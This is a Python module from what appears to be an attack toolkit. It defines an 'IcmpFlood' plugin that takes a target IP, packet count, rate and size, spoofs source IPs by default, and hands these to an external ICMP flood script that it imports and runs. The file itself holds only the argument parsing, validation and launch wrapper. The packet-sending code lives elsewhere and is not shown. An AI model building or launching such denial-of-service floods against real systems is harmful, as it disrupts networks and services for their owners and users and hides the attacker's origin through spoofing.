"""ICMP Flood attack implementation"""

import argparse
import sys
import os
import logging

from .base import AttackBase

logger = logging.getLogger(__name__)

class IcmpFlood(AttackBase):
    """ICMP Flood (Ping Flood) attack implementation"""

    name = "icmp-flood"
    description = "Perform ICMP flood attack (Ping Flood)"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        # Target configuration
        target_group = parser.add_argument_group('Target Configuration')
        target_group.add_argument('--target', required=True, help='Target IP address')

        # Attack behavior
        behavior_group = parser.add_argument_group('Attack Behavior')
        behavior_group.add_argument('--count', type=int, default=1000, help='Number of packets to send')
        behavior_group.add_argument('--rate', type=int, default=100, help='Packets per second')
        behavior_group.add_argument('--size', type=int, default=64, help='Packet size in bytes (8-65500)')
        behavior_group.add_argument('--spoof', action='store_true', default=True, help='Use random source IPs')
        behavior_group.add_argument('--no-spoof', dest='spoof', action='store_false', help='Disable IP spoofing')

        # Monitoring
        monitor_group = parser.add_argument_group('Monitoring')
        monitor_group.add_argument('--verbose', action='store_true', help='Enable verbose output')

    def validate(self, args: argparse.Namespace) -> bool:
        # Validate target IP
        if not self.validator.validate_ip(args.target, allow_private=True, allow_loopback=False):
            logger.error(f"Invalid target IP address: {args.target}")
            return False

        # Validate numeric parameters
        if args.count <= 0:
            logger.error(f"Invalid packet count: {args.count}")
            return False
        if args.rate <= 0:
            logger.error(f"Invalid rate: {args.rate}")
            return False
        if args.size < 8 or args.size > 65500:
            logger.error(f"Invalid packet size: {args.size} (must be 8-65500)")
            return False

        return True

    def run(self, args: argparse.Namespace) -> None:
        # Import the original attack script
        scripts_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'scripts')
        icmp_flood_path = os.path.join(scripts_dir, 'icmp_flood')

        sys.path.insert(0, icmp_flood_path)
        try:
            import icmp_flood as attack_module

            attack = attack_module.ICMPFloodAttack(
                target_ip=args.target,
                packet_count=args.count,
                rate=args.rate,
                packet_size=args.size,
                spoof_ip=args.spoof,
                verbose=args.verbose
            )

            logger.info(f"Running ICMP flood attack against {args.target}")
            attack.execute()

        except ImportError as e:
            logger.error(f"Failed to import ICMP flood attack script: {str(e)}")
            raise
        except Exception as e:
            logger.error(f"Attack failed: {str(e)}")
            raise
        finally:
            sys.path.remove(icmp_flood_path)
